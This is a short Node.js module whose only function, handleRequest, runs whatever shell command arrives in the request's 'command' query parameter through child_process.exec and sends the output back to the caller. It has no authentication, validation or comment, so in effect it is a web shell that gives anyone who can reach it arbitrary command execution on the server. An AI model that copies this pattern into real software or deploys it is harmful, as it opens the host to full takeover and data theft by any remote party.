const childProcess = require("child_process");

function handleRequest(request, response) {
  childProcess.exec(request.query.command, (_error, stdout) => response.end(stdout));
}

module.exports = { handleRequest };
